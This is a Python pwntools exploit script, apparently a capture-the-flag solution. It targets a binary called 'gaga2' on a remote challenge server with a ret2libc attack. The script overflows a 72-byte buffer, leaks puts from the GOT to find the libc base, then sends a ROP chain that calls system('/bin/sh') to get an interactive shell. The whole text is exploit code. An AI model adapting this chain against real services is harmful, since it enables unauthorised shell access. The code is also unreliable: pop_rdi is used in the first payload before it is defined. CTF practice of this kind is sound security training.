from pwn import *

binary = './gaga2'
elf = context.binary = ELF(binary, checksec=True)
rop = ROP(elf)
libc = ELF('./libc6_2.31-0ubuntu9.9_amd64.so')
#p = process(binary)
p = remote('challs.actf.co',31302)

#libc https://libc.blukat.me/?q=puts%3A0x7f28a104c420&l=libc6_2.31-0ubuntu9.9_amd64



print(p.recv())

#LEAK GOT PLT
leaker = b'a'*72
leaker+= p64(pop_rdi)
leaker+= p64(elf.got.puts)
leaker+= p64(elf.plt.puts)
leaker+= p64(elf.symbols.main)

p.sendline(leaker)

puts = u64(p.recvline().replace(b'\n',b'').ljust(8,b'\0'))
log.info(f'Puts : {hex(puts)}')
libc_addr = puts - 0x84420
log.info(f'Libc Addr : {hex(libc_addr)}')
p.recv()
#Getting Shell
#Gadgets
pop_rdi = 0x4012b3
system = libc_addr + 0x52290
binsh = libc_addr + 0x1b45bd
ret =0x000000000040101a

log.info(f'pop rdi : {hex(pop_rdi)}')
log.info(f'system : {hex(system)}')
log.info(f'bin_sh : {hex(binsh)}')
log.info(f'ret : {hex(ret)}')


payload = b'a'*72
payload+= p64(pop_rdi)
payload+= p64(binsh)
payload+= p64(ret)
payload+= p64(system)

p.sendline(payload)


p.interactive()